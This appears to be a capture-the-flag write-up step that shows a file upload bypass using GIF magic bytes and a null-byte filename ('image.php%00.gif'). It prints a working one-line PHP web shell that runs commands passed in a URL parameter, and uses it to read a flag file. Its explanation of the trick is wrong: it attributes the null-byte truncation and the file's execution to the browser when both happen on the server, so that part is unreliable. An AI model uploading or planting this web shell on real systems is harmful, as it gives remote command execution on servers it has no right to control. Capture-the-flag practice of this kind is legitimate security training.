+  “Arbitrary File Upload” with magic byte, and null byte file extension manipulation.
+  Write a file with the following contents and save it as `image.php%00.gif`
```
GIF87a;  
<?php system($_GET["cmd"]); ?>
```
+ Here, “GIF87a” will work as Magic bytes or file-type identifier, and it will identify as GIF
+ Note that the filename is “image.php%00.gif” extension. This is because if we used only “.php” or “.gif.php” then the application’s upload filter may complain and won’t allow us to upload file. If we used “.php.gif” then browser would think it as GIF image ignoring the Magic Bytes. So, we need a way where the last extension in name remains “.gif” but the effective extension for browser becomes “.php”. This is where “%00” comes into picture. “%00” is null terminator, which for browsers is string terminator. Thus as far as browser is concerned even though the file name consists “image.php%00.gif”, effectively for browser it is only “image.php”.
+ Since we can execute any bash commands, looking around is easy, and we will see that in the parent directory of current directory, there is “flag.flag” file . Read it and we get the flag.


